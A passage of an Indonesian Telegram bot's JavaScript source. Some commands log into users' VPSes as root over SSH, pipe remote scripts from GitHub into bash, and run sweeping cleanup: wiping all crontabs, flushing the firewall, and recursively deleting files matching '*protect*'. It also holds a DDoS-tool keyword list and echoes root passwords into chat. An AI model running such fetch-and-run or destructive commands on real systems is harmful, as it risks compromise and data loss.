<b>👑 Usia:</b> ${info.usia || "-"}
<b>🌍 Tempat Tinggal:</b> ${info.tmp || "-"}
<b>📜 Kisah:</b>
${info.description || "-"}
`;

    // === FIX: AUTO SPLIT TELEGRAM MESSAGE ===
    const maxLength = 3500; // aman, <4096 limit

    if (message.length <= maxLength) {
      await bot.sendMessage(chatId, message, { parse_mode: "HTML" });
    } else {
      const parts = message.match(/[\s\S]{1,3500}/g);
      for (const part of parts) {
        await bot.sendMessage(chatId, part, { parse_mode: "HTML" });
      }
    }

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

  } catch (err) {
    console.error("Kisah Nabi Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil kisah nabi.");
  }
});

// ==========================
// FITUR /NULIS FIX (NO HTML ERROR)
// ==========================

const nulisAskMap = {}; 

function escapeHtml(text) {
  return text
    .toString()
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// 1) Command /nulis → bot kirim ASK
bot.onText(/\/nulis/, async (msg) => {
  const chatId = msg.chat.id;

  const ask = await bot.sendMessage(
    chatId,
    "```✏️ Masukkan format nulis:\n\n" +
      "hari,nama,kelas,teks\n\n" +
      "Contoh:\n" +
      "Senin,Nina,XI IPA 1,belajar rajin ya\n\n" +
      "╰┈➤ Balas (reply pesan) pesan ini yang di kirim bot!```",
    { parse_mode: "Markdown" }
  );

  nulisAskMap[chatId] = ask.message_id;
});

// 2) Bot terima jawaban user
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.text) return;
  if (msg.text.startsWith("/")) return;
  if (!msg.reply_to_message) return;

  if (!(nulisAskMap[chatId] && msg.reply_to_message.message_id === nulisAskMap[chatId])) {
    return;
  }

  const input = msg.text.trim();
  const parts = input.split(",");

  if (parts.length < 4) {
    return bot.sendMessage(chatId, "❌ Format salah!\nGunakan:\n`hari,nama,kelas,teks`", {
      parse_mode: "Markdown",
    });
  }

  const [hari,nama,kelas, ...rest] = parts;
  const text = rest.join(",").trim();

  // waktu otomatis
  const now = new Date();
  const waktuOto = `${now.getDate()}-${now.getMonth() + 1}-${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}`;

  const loading = await bot.sendMessage(chatId, "⏳ Membuat tulisan tangan...", {
    parse_mode: "Markdown",
  });

  try {
    const url = `https://brat.siputzx.my.id/nulis?waktu=${encodeURIComponent(
      waktuOto
    )}&hari=${encodeURIComponent(hari)}&nama=${encodeURIComponent(
      nama
    )}&kelas=${encodeURIComponent(kelas)}&text=${encodeURIComponent(
      text
    )}&type=1`;

    const res = await fetch(url);
    const buffer = Buffer.from(await res.arrayBuffer());

    await bot.sendPhoto(chatId, buffer, {
      caption:
        `✏️ *Hasil Tulisan*\n` +
        `👤 ${escapeHtml(nama)} — ${escapeHtml(kelas)}\n` +
        `📅 ${escapeHtml(hari)}, ${escapeHtml(waktuOto)}\n\n` +
        `✔️ Tulisan berhasil dibuat!`,
      parse_mode: "Markdown",
    });

    bot.deleteMessage(chatId, loading.message_id).catch(() => {});

    delete nulisAskMap[chatId];
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal membuat tulisan tangan.", { parse_mode: "Markdown" });
  }
});

// ==========================
// /doa <kata_kunci>
// ==========================
bot.onText(/\/doa (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const keyword = match[1]; // ambil kata kunci setelah /doa

    try {
        bot.sendMessage(chatId, "⏳ Mencari doa...");

        const apiUrl = `https://api-faa.my.id/faa/doa?q=${encodeURIComponent(keyword)}`;
        const res = await axios.get(apiUrl);
        const body = res.data;

        if (!body || !body.data || body.data.length === 0) {
            return bot.sendMessage(chatId, "❌ Doa tidak ditemukan.");
        }

        const doa = body.data[0];

        const text =
`📖 *Doa Ditemukan*
🔎 Kata kunci: *${keyword}*

*Judul:* ${doa.doa}
*Arab:* ${doa.ayat}
*Latin:* _${doa.latin}_
*Arti:* ${doa.artinya}`;

        bot.sendMessage(chatId, text, { parse_mode: "Markdown" });

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data.");
    }
});

// ==============================
// 1. COMMAND UNTUK MEMINTA FOTO
// ==============================
bot.onText(/\/tojapanese/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🇯🇵 *Kirim foto kamu dengan membalas (reply) pesan ini*\nAkan dibuat jadi poster cewe Jepang.",
        { parse_mode: "Markdown" }
    );

    bot.toJapaneseAsk = ask.message_id;
});

// ==============================
// 2. SAAT USER MENGIRIM FOTO
// ==============================
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan user reply ke pesan bot sebelumnya
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.toJapaneseAsk) return;

    try {
        // Ambil file foto
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const fileLink = await bot.getFileLink(fileId);

        bot.sendMessage(chatId, "⏳ Membuat poster Jepang...");

        // Panggil API ToJapanese
        const apiUrl = `https://api-faa.my.id/faa/tojapanese?url=${encodeURIComponent(fileLink)}`;
        const response = await axios.get(apiUrl, { responseType: "arraybuffer" });

        // Kirim hasil foto
        await bot.sendPhoto(chatId, response.data, {
            caption: "✨ Siap! Ini versi Jepang kamu 🇯🇵"
        });

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses gambar.");
    }
});

// ─── /setpwvps (Ganti password root VPS via SSH + Premium) ───────────────────
bot.onText(/^\/setpwvps(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;

  // Validasi premium (disamakan dengan command lain)
  if (!premium(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya user *Premium* yang bisa memakai perintah ini!", {
      parse_mode: "Markdown"
    });
  }

  let text = match[1];
  if (!text) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/setpwvps ipvps|password_lama|password_baru`", {
      parse_mode: "Markdown"
    });
  }

  let t = text.split("|");
  if (t.length < 3) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh:\n`/setpwvps ipvps|password_lama|password_baru`", {
      parse_mode: "Markdown"
    });
  }

  let ipvps = t[0].trim();
  let passwd = t[1].trim();
  let newpw = t[2].trim();

  await bot.sendMessage(chatId, "⏳ Sedang memproses ganti password VPS...");

  const conn = new Client();

  conn.on("ready", () => {
    const cmd = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;

    conn.exec(cmd, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, "❌ Gagal menjalankan perintah di VPS.");
        return conn.end();
      }

      let stderr = "";
      let stdout = "";

      stream.on("data", (data) => {
        stdout += data.toString();
        console.log("STDOUT:", data.toString());
      });

      stream.stderr.on("data", (data) => {
        let out = data.toString();
        stderr += out;
        console.log("STDERR:", out);

        // Script meminta input, otomatis kirim password baru
        if (out.includes("8)")) {
          stream.write("8\n");
        }
        if (out.toLowerCase().includes("new password")) {
          stream.write(`${newpw}\n`);
        }
        if (out.toLowerCase().includes("retype new password")) {
          stream.write(`${newpw}\n`);
        }
      });

      stream.on("close", () => {
        conn.end();
        bot.sendMessage(chatId, 
`✅ *Sukses Mengganti Password VPS!*

*Detail Password Baru:*
📌 IP VPS: \`${ipvps}\`
🔑 Password Baru: \`${newpw}\`
`, { parse_mode: "Markdown" });
      });
    });
  });

  conn.on("error", (err) => {
    console.log("SSH ERROR:", err);
    bot.sendMessage(chatId, "❌ IP atau Password VPS kamu salah, atau VPS tidak merespon.");
  });

  conn.connect({
    host: ipvps,
    port: 22,
    username: "root",
    password: passwd
  });
});

// ─── /installprotectall (versi SSH2 + premium) ────────────────────
bot.onText(/^\/installprotectall (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;

  // Validasi premium
  if (!premium(userId)) {
    return bot.sendMessage(chatId, 
`❌ *Akses ditolak!*
Perintah ini hanya untuk *User Premium!*`, 
{ parse_mode: "Markdown" });
  }

  const input = match[1];

  if (!input.includes('|')) {
    return bot.sendMessage(
      chatId,
      '❌ Format salah!\nGunakan: `/installprotectall ipvps|pwvps`',
      { parse_mode: 'Markdown' }
    );
  }

  const [ipvps, pwvps] = input.split('|').map(i => i.trim());

  if (!ipvps || !pwvps) {
    return bot.sendMessage(
      chatId,
      '❌ Format salah!\nGunakan: `/installprotectall ipvps|pwvps`',
      { parse_mode: 'Markdown' }
    );
  }

  const conn = new Client();

  const scripts = [
    'mbut.sh',
    'mbut2.sh',
    'mbut3.sh',
    'mbut4.sh',
    'mbut5.sh',
    'mbut6.sh',
    'mbut7.sh',
    'mbut8.sh',
    'mbut9.sh',
    'mbut10.sh'
  ];

  bot.sendMessage(
    chatId,
    `⏳ Menghubungkan ke VPS *${ipvps}*...\nMemulai instalasi Protect Panel *1–10*`,
    { parse_mode: "Markdown" }
  );

  conn.on("ready", async () => {
    bot.sendMessage(chatId, "⚙️ Koneksi SSH berhasil! Memulai instalasi semua panel...", {
      parse_mode: "Markdown"
    });

    for (let i = 0; i < scripts.length; i++) {
      const scriptURL = `https://raw.githubusercontent.com/antirusuhnihdeks/mbut/main/${scripts[i]}`;

      bot.sendMessage(chatId, `🚀 Menjalankan *${scripts[i]}*...`, {
        parse_mode: "Markdown"
      });

      await new Promise((resolve) => {
        conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
          if (err) {
            bot.sendMessage(chatId, `❌ Gagal menjalankan ${scripts[i]}:\n\`${err.message}\``,
              { parse_mode: "Markdown" });
            return resolve();
          }

          let output = "";

          stream.on("data", (data) => {
            output += data.toString();
          });

          stream.stderr.on("data", (data) => {
            output += `\n[ERR] ${data.toString()}`;
          });

          stream.on("close", () => {
            const cleanOutput = output.trim().slice(-3500) || "(tidak ada output)";

            bot.sendMessage(chatId,
              `✅ *${scripts[i]} selesai!*\n📦 Output:\n\`\`\`${cleanOutput}\`\`\``,
              { parse_mode: "Markdown" }
            );

            resolve();
          });
        });
      });
    }

    conn.end();
    bot.sendMessage(chatId, "🎉 Semua instalasi Protect Panel 1–10 selesai!", {
      parse_mode: "Markdown"
    });
  });

  conn.on("error", (err) => {
    bot.sendMessage(
      chatId,
      `❌ Gagal terhubung ke VPS!\nPeriksa IP / Password.\n\nError:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  });

  conn.connect({
    host: ipvps,
    port: 22,
    username: "root",
    password: pwvps
  });
});

bot.onText(/^\/uninstallprotectall (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // ===== VALIDASI PREMIUM =====
  if (!premium(userId)) {
    return bot.sendMessage(chatId, 
`❌ *Akses ditolak!*
Perintah ini hanya untuk *User Premium!*`, 
{ parse_mode: "Markdown" });
  }

  const input = match[1];

  if (!input.includes("|")) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nGunakan: `/uninstallprotectall ipvps|pwvps`",
      { parse_mode: "Markdown" }
    );
  }

  const [ipvps, pwvps] = input.split("|").map(i => i.trim());

  if (!ipvps || !pwvps) {
    return bot.sendMessage(
      chatId,
      "❌ IP VPS atau Password kosong!",
      { parse_mode: "Markdown" }
    );
  }

  const conn = new Client();

  // ===== LIST FILE / SERVICE YANG DIBERSIHKAN =====
  const cleanupCommands = [

  // ===============================
  // 1️⃣ KILL SEMUA PROSES TERKAIT
  // ===============================
  "pkill -f mbut || true",
  "pkill -f protect || true",
  "pkill -f panel || true",
  "pkill -f guard || true",
  "killall mbut 2>/dev/null || true",

  // ===============================
  // 2️⃣ STOP & DISABLE SERVICE
  // ===============================
  "systemctl disable --now mbut* 2>/dev/null || true",
  "systemctl disable --now panel* 2>/dev/null || true",
  "systemctl disable --now guard* 2>/dev/null || true",

  // ===============================
  // 3️⃣ HAPUS SYSTEMD UNIT
  // ===============================
  "rm -f /etc/systemd/system/*mbut*",
  "rm -f /etc/systemd/system/*panel*",
  "rm -f /etc/systemd/system/*guard*",
  "rm -f /lib/systemd/system/*mbut*",

  // ===============================
  // 4️⃣ CRON (ROOT + SEMUA USER)
  // ===============================
  "crontab -r || true",
  "for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -r 2>/dev/null; done",

  // ===============================
  // 5️⃣ RC & AUTO START
  // ===============================
  "sed -i '/mbut/d;/protect/d;/panel/d' /etc/rc.local 2>/dev/null || true",
  "sed -i '/mbut/d;/protect/d;/panel/d' /root/.bashrc 2>/dev/null || true",
  "sed -i '/mbut/d;/protect/d;/panel/d' /etc/profile 2>/dev/null || true",

  // ===============================
  // 6️⃣ IPTABLES TOTAL CLEAN
  // ===============================
  "iptables -P INPUT ACCEPT",
  "iptables -P FORWARD ACCEPT",
  "iptables -P OUTPUT ACCEPT",
  "iptables -F",
  "iptables -X",
  "iptables -t nat -F",
  "iptables -t nat -X",
  "iptables -t mangle -F",
  "iptables -t mangle -X",
  "iptables-save > /etc/iptables/rules.v4 2>/dev/null || true",

  // ===============================
  // 7️⃣ FILE & BINARY TERSEMBUNYI
  // ===============================
  "find /usr /etc /root /opt /var -iname '*mbut*' -exec rm -rf {} + 2>/dev/null",
  "find /usr /etc /root /opt /var -iname '*protect*' -exec rm -rf {} + 2>/dev/null",

  // ===============================
  // 8️⃣ PANEL & WEB SERVICE REFRESH
  // ===============================
  "systemctl restart nginx || true",
  "systemctl restart apache2 || true",
  "systemctl restart pteroq || true",
  "systemctl restart wings || true",

  // ===============================
  // 9️⃣ SYSTEMD REFRESH
  // ===============================
  "systemctl daemon-reexec",
  "systemctl daemon-reload",
  "systemctl reset-failed"
];

  bot.sendMessage(
    chatId,
    `⏳ Menghubungkan ke VPS *${ipvps}*...\n🧹 Memulai uninstall *Protect Panel ALL*`,
    { parse_mode: "Markdown" }
  );

  conn.on("ready", async () => {
    bot.sendMessage(
      chatId,
      "⚙️ Koneksi SSH berhasil!\n🧹 Membersihkan Protect Panel 1–10...",
      { parse_mode: "Markdown" }
    );

    for (let i = 0; i < cleanupCommands.length; i++) {
      const cmd = cleanupCommands[i];

      await new Promise((resolve) => {
        conn.exec(cmd, (err, stream) => {
          if (err) {
            bot.sendMessage(
              chatId,
              `❌ Gagal menjalankan:\n\`${cmd}\`\n\nError:\n\`${err.message}\``,
              { parse_mode: "Markdown" }
            );
            return resolve();
          }

          let output = "";

          stream.on("data", (data) => {
            output += data.toString();
          });

          stream.stderr.on("data", (data) => {
            output += `\n[ERR] ${data.toString()}`;
          });

          stream.on("close", () => {
            const cleanOutput =
              output.trim().slice(-3000) || "(tidak ada output)";

            bot.sendMessage(
              chatId,
              `✅ *Command selesai:*\n\`${cmd}\`\n\n📦 Output:\n\`\`\`${cleanOutput}\`\`\``,
              { parse_mode: "Markdown" }
            );
            resolve();
          });
        });
      });
    }

    conn.end();
    bot.sendMessage(
      chatId,
      "🎉 *UNINSTALL SELESAI!*\n🧹 Semua Protect Panel 1–10 berhasil dibersihkan.",
      { parse_mode: "Markdown" }
    );
  });

  conn.on("error", (err) => {
    bot.sendMessage(
      chatId,
      `❌ Gagal terhubung ke VPS!\n\nError:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  });

  conn.connect({
    host: ipvps,
    port: 22,
    username: "root",
    password: pwvps
  });
});

// ======== FITUR /checkerror (CEK ERROR + POTONGAN CODE RINGKAS) ======== //
bot.onText(/^\/cekerror$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (blacklistedCommands.includes('/cekerror')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (!reply) {
    return bot.sendMessage(
      chatId,
      "⚠️ Balas ke file .js/.txt atau text code untuk mengecek error.",
      { parse_mode: "Markdown" }
    );
  }

  let code = "";

  // ====== REPLY FILE ======
  if (reply.document) {
    const fileId = reply.document.file_id;
    const fileName = reply.document.file_name;
    const fileLink = await bot.getFileLink(fileId);

    const tempDir = path.join(__dirname, "temp");
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

    const tempPath = path.join(tempDir, fileName);

    try {
      const response = await axios.get(fileLink, { responseType: "arraybuffer" });
      fs.writeFileSync(tempPath, response.data);

      code = fs.readFileSync(tempPath, "utf8");

      setTimeout(() => fs.unlinkSync(tempPath), 10000);
    } catch (err) {
      return bot.sendMessage(
        chatId,
        "❌ Gagal mengambil file.",
        { parse_mode: "Markdown" }
      );
    }
  }

  // ====== REPLY TEXT ======
  else if (reply.text) {
    code = reply.text;
  } else {
    return bot.sendMessage(
      chatId,
      "⚠️ Balas ke text code atau file .js/.txt untuk mengecek error.",
      { parse_mode: "Markdown" }
    );
  }

  // ====== CEK ERROR ======
  try {
    const vm = require("vm");
    const script = new vm.Script(code, { displayErrors: true });
    const context = vm.createContext({});
    script.runInContext(context);

    return bot.sendMessage(
      chatId,
      "```\n✅ Tidak ditemukan error syntax atau runtime pada kode.\n```",
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    // ===== Ambil lokasi error =====
    const lineMatch = err.stack.match(/<anonymous>:(\d+):(\d+)/);
    const line = lineMatch ? parseInt(lineMatch[1]) : null;
    const col = lineMatch ? parseInt(lineMatch[2]) : null;

    const codeLines = code.split("\n");

    // ===== Ambil ±2 baris sebelum & sesudah error =====
    let startLine = line ? Math.max(line - 3, 0) : 0;
    let endLine = line ? Math.min(line + 2, codeLines.length) : codeLines.length;
    let snippet = codeLines.slice(startLine, endLine).map((txt, idx) => {
      const currLine = startLine + idx + 1;
      let pointer = (currLine === line && col) ? " ".repeat(col - 1) + "^ ERROR DISINI" : "";
      return `${currLine.toString().padStart(4,' ')} | ${txt}\n${pointer}`;
    }).join("\n");

    // ===== Penjelasan error bahasa Indonesia =====
    let explanation = "";
    if (err.name === "SyntaxError") {
      explanation = "Kesalahan penulisan sintaks kode. Bisa disebabkan oleh kurung/kurawal kurang, karakter asing, tanda baca salah, atau struktur kode tidak lengkap.";
    } else if (err.name === "ReferenceError") {
      explanation = "Variabel/fungsi yang dipanggil tidak didefinisikan.";
    } else if (err.name === "TypeError") {
      explanation = "Ada tipe data yang tidak sesuai atau operasi ilegal pada tipe data.";
    } else {
      explanation = "Terjadi kesalahan kode lainnya, silakan cek pesan error berikut.";
    }

    const message =
`❌ Ditemukan Error pada Kode

Jenis Error  : ${err.name}
Pesan Error  : ${err.message}
Baris Error  : ${line || "Tidak diketahui"}
Kolom Error  : ${col || "Tidak diketahui"}

📌 Penjelasan:
${explanation}

🧩 Potongan kode sekitar error:
\`\`\`
${snippet}
\`\`\`
`;

    return bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  }
});

let userData = {};

// Random name jika user tidak memberikan
function randomName() {
  const chars = "abcdefghijklmnopqrstuvwxyz1234567890";
  let name = "";
  for (let i = 0; i < 10; i++) name += chars[Math.floor(Math.random() * chars.length)];
  return name;
}

// Generate email dengan nama
function generateMail(customName) {
  const name = customName || randomName();
  return `${name}@1secmail.com`;
}

// GET request
async function get(url) {
  const r = await fetch(url);
  return r.json();
}

// ─────────────────────────────────────────
// /tempmail <nama>
// ─────────────────────────────────────────
bot.onText(/\/createemail(.*)/, (msg, match) => {
  const id = msg.chat.id;

  // nama custom
  const custom = match[1].trim();
  const name = custom !== "" ? custom.replace(/\s+/g, "") : randomName();

  const email = generateMail(name);
  userData[id] = { email, lastIds: [] };

  bot.sendMessage(
    id,
    `✉️ *Email Kamu Sudah Dibuat!*\n\n` +
    `Email: \`${email}\`\n\n` +
    `Bot akan *otomatis mengirimkan OTP/kode* jika ada email baru.\n`,
    { parse_mode: "Markdown" }
  );
});

// ─────────────────────────────────────────
// /cekmail
// ─────────────────────────────────────────
bot.onText(/\/cekemail/, async (msg) => {
  const id = msg.chat.id;
  if (!userData[id]) return bot.sendMessage(id, "❌ Kamu belum membuat email.");

  const email = userData[id].email;
  const [login, domain] = email.split("@");

  const inbox = await get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);

  if (!inbox.length) return bot.sendMessage(id, "📭 Belum ada email masuk.");

  let text = `📨 *Inbox untuk ${email}:*\n\n`;
  inbox.forEach(m => {
    text += `ID: *${m.id}*\nDari: \`${m.from}\`\nSubjek: *${m.subject}*\nTanggal: ${m.date}\n\n`;
  });

  bot.sendMessage(id, text, { parse_mode: "Markdown" });
});

// ─────────────────────────────────────────
// AUTO CHECK EMAIL MASUK SETIAP 5 DETIK
// ─────────────────────────────────────────
setInterval(async () => {
  for (const userId in userData) {
    const { email, lastIds } = userData[userId];

    const [login, domain] = email.split("@");
    const inbox = await get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);

    if (!inbox.length) continue;

    for (const mail of inbox) {
      if (!lastIds.includes(mail.id)) {
        userData[userId].lastIds.push(mail.id); // tandai sudah dikirim

        const detail = await get(
          `https://www.1secmail.com/api/v1/?action=readMessage&login=${login}&domain=${domain}&id=${mail.id}`
        );

        let isi = detail.textBody || detail.htmlBody || "";

        // Deteksi kode / angka (OTP)
        const otp = isi.match(/\b\d{4,8}\b/); // deteksi angka 4–8 digit

        let pesan = `📩 *Email Baru Masuk!*\n\n`;
        pesan += `Dari: \`${detail.from}\`\nSubjek: *${detail.subject}*\n\n`;

        if (otp) {
          pesan += `🔐 *Kode Terdeteksi:* \`${otp[0]}\`\n\n`;
        }

        pesan += `📜 *Isi:* \n${isi.substring(0, 4000)}`;

        bot.sendMessage(userId, pesan, { parse_mode: "Markdown" });
      }
    }
  }
}, 5000);


const PROTECT_PANEL_FILE = './panelprotect.json';
const PROTECT_SERVERS_FILE = './panel_servers.json';

try { if (!fs.existsSync(PROTECT_PANEL_FILE)) fs.writeFileSync(PROTECT_PANEL_FILE, JSON.stringify({ panels: [] }, null, 2)); } catch (e) { console.error(e.message); }
try { if (!fs.existsSync(PROTECT_SERVERS_FILE)) fs.writeFileSync(PROTECT_SERVERS_FILE, JSON.stringify({}), null, 2); } catch (e) { console.error(e.message); }

const SAFE_FILES = ["package.json", "package-lock.json", ".env"];
const PROTECT_POLL_INTERVAL = 400 * 99999;
const CPU_THRESHOLD_PERCENT = 5000;
const CPU_STRIKE_LIMIT = 2;
const MAX_FILE_READ_BYTES = 5000 * 99999;
const FILE_SCAN_DEPTH = 15;
const SUSPICIOUS_KEYWORDS = [
  "ddos",
  "dos",
  "attack",
  "flood",
  "flooder",
  "stress",
  "stresser",
  "booter",
  "botnet",
  "l4",
  "layer4",
  "tcpflood",
  "udpflood",
  "udp",
  "synflood",
  "tcp",
  "syn",
  "ack",
  "handshake",
  "layer7",
  "l7",
  "httpflood",
  "http-req",
  "http-spam",
  "tlsflood",
  "cfbypass",
  "uam",
  "httpget",
  "http-post",
  "loader",
  "cnc",
  "commandbot",
  "scanbot",
  "zombies",
  "botclient",
  "slowloris",
  "hammer",
  "hulk",
  "goldeneye",
  "xerxes",
  "ripper",
  "killnet",
  "loic",
  "hoic",
  "tor-shooter",
  "ddos.py",
  "ddos.js",
  "ddos.sh",
  "flood.py",
  "flood.sh",
  "attack.py",
  "udp.py",
  "stress.py",
  "botnet.py",
  "l7.py",
  "l4.py",
  "ratnet",
  "orion",
  "hydra",
  "nitro",
  "mirai",
  "mushtik",
  "mozi",
  "ddoser",
  "pinger"
];

function readPanels() {
  try { return JSON.parse(fs.readFileSync(PROTECT_PANEL_FILE, 'utf-8')).panels || []; } catch { return []; }
}
function writePanels(panels) {
  try { fs.writeFileSync(PROTECT_PANEL_FILE, JSON.stringify({ panels }, null, 2)); } catch (e) { console.error(e.message); }
}

function readPanelServers() {
  try { return JSON.parse(fs.readFileSync(PROTECT_SERVERS_FILE, 'utf-8')) || {}; } catch { return {}; }
}
function writePanelServers(obj) {
  try { fs.writeFileSync(PROTECT_SERVERS_FILE, JSON.stringify(obj, null, 2)); } catch (e) { console.error(e.message); }
}

async function PROTECT_notifyOwners(text) {
  try {
    if (Array.isArray(config.OWNER_ID)) {
      for (const o of config.OWNER_ID) {
        try { await bot.sendMessage(o, text, { parse_mode: 'Markdown' }); } catch {}
      }
    } else {
      try { await bot.sendMessage(config.OWNER_ID, text, { parse_mode: 'Markdown' }); } catch {}
    }
    if (config.NOTIF_ID) {
      try { await bot.sendMessage(config.NOTIF_ID, text, { parse_mode: 'Markdown' }); } catch {}
    }
  } catch (e) { }
}

async function PROTECT_get(url, headers = {}, timeout = 8000) {
  try {
    const res = await axios.get(url, { headers, timeout });
    return res;
  } catch (err) {
    return null;
  }
}

async function PROTECT_filesWalk(domain, clientKey, serverId, directory = "/", depth = 0, maxDepth = FILE_SCAN_DEPTH) {
  const found = [];
  if (depth > maxDepth) return found;
  try {
    const url = `${domain.replace(/\/+$/, '')}/api/client/servers/${encodeURIComponent(serverId)}/files/list?directory=${encodeURIComponent(directory)}`;
    const res = await axios.get(url, { headers: { Authorization: `Bearer ${clientKey}`, Accept: 'application/json' }, timeout: 8000 });
    const items = res.data?.data || [];
    for (const it of items) {
      const name = it.attributes?.name || '';
      const type = it.attributes?.type || it.attributes?.mode || 'file';
      const fullPath = (directory === '/' ? '' : directory) + '/' + name;
      found.push({ name, type, path: fullPath.replace(/\/+/g, '/') });
      if ((type === 'directory' || it.attributes?.type === 'directory') && depth < maxDepth) {
        const subs = await PROTECT_filesWalk(domain, clientKey, serverId, fullPath, depth + 1, maxDepth);
        found.push(...subs);
      }
    }
  } catch (e) {
  }
  return found;
}

async function PROTECT_tryReadFile(domain, clientKey, serverId, filePath) {
  try {
    const url = `${domain.replace(/\/+$/, '')}/api/client/servers/${encodeURIComponent(serverId)}/files/contents?file=${encodeURIComponent(filePath)}`;
    const res = await axios.get(url, { headers: { Authorization: `Bearer ${clientKey}`, Accept: 'application/json' }, timeout: 7000 });
    const content = res.data?.data?.content;
    if (!content) return null;
    if (typeof content !== 'string') return null;
    if (content.length <= MAX_FILE_READ_BYTES) {
      if (/^[A-Za-z0-9+/=\n\r]+$/.test(content) && content.length % 4 === 0 && content.length > 100) {
        try {
          const buff = Buffer.from(content, 'base64');
          if (buff.length <= MAX_FILE_READ_BYTES) return buff.toString('utf-8');
          return null;
        } catch { }
      }
      return content;
    }
    return null;
  } catch (e) {
    return null;
  }
}

async function PROTECT_deleteFiles(domain, clientKey, serverId, filesArray) {
  if (!Array.isArray(filesArray) || filesArray.length === 0) return;
  try {
    const url = `${domain.replace(/\/+$/, '')}/api/client/servers/${encodeURIComponent(serverId)}/files/delete`;
    await axios.post(url, { root: "/", files: filesArray }, { headers: { Authorization: `Bearer ${clientKey}`, Accept: 'application/json' }, timeout: 10000 });
  } catch (e) {
  }
}

async function PROTECT_deleteServer(domain, adminKey, serverId) {
  try {
    const url = `${domain.replace(/\/+$/, '')}/api/application/servers/${encodeURIComponent(serverId)}`;
    await axios.delete(url, { headers: { Authorization: `Bearer ${adminKey}`, Accept: 'application/json' }, timeout: 10000 });
  } catch (e) {
  }
}

async function PROTECT_getServerDetails(domain, adminKey, serverId) {
  try {
    const url = `${domain.replace(/\/+$/, '')}/api/application/servers/${encodeURIComponent(serverId)}`;
    const res = await axios.get(url, { headers: { Authorization: `Bearer ${adminKey}`, Accept: 'application/json' }, timeout: 9000 });
    return res.data?.attributes || null;
  } catch (e) {
    return null;
  }
}

async function PROTECT_getResources(domain, clientKey, serverId) {
  try {
    const url = `${domain.replace(/\/+$/, '')}/api/client/servers/${encodeURIComponent(serverId)}/resources`;
    const res = await axios.get(url, { headers: { Authorization: `Bearer ${clientKey}`, Accept: 'application/json' }, timeout: 8000 });
    return res.data?.attributes?.resources || null;
  } catch (e) {
    return null;
  }
}

const PROTECT_cpuStrike = {};
const PROTECT_lastAction = {};

async function PROTECT_autoDetectAndRegister(panel) {
  const domain = panel.domain;
  const adminKey = panel.plta;
  try {
    const url = `${domain.replace(/\/+$/, '')}/api/application/servers`;
    const res = await axios.get(url, { headers: { Authorization: `Bearer ${adminKey}`, Accept: 'application/json' }, timeout: 9000 });
    const list = res.data?.data || [];
    if (!Array.isArray(list)) return;
    const panelServers = readPanelServers();
    if (!panelServers[domain]) panelServers[domain] = [];

    for (const s of list) {
      const sid = s.attributes?.identifier;
      const name = s.attributes?.name || s.attributes?.server || 'Unknown';
      if (!panelServers[domain].some(x => x.id === sid)) {
        panelServers[domain].push({ id: sid, name, lastSeen: Date.now() });
        writePanelServers(panelServers);
        await PROTECT_notifyOwners(`🆕 *New server detected & auto-protected*\nPanel: ${domain}\nName: *${name}*\nID: \`${sid}\``);
      } else {
        const found = panelServers[domain].find(x => x.id === sid);
        if (found) found.lastSeen = Date.now();
      }
    }
    writePanelServers(panelServers);
  } catch (e) {
  }
}

async function PROTECT_mainLoop() {
  const panels = readPanels();
  const panelServers = readPanelServers();

  for (const panel of panels) {
    const domain = panel.domain;
    const adminKey = panel.plta;
    const clientKey = panel.pltc;
    if (!domain || !adminKey || !clientKey) continue;

    await PROTECT_autoDetectAndRegister(panel);

    const monitored = panelServers[domain] || [];

    for (const srvEntry of monitored) {
      const sid = srvEntry.id;
      const sName = srvEntry.name || 'Unknown';

      const cooldownKey = `${domain}::${sid}`;
      const lastAct = PROTECT_lastAction[cooldownKey] || 0;
      if (Date.now() - lastAct < 15 * 1000) continue;

      const resources = await PROTECT_getResources(domain, clientKey, sid);
      if (!resources) continue;

      const cpu = typeof resources.cpu_absolute === 'number' ? resources.cpu_absolute : parseFloat(resources.cpu_absolute) || 0;

      if (!PROTECT_cpuStrike[cooldownKey]) PROTECT_cpuStrike[cooldownKey] = 0;
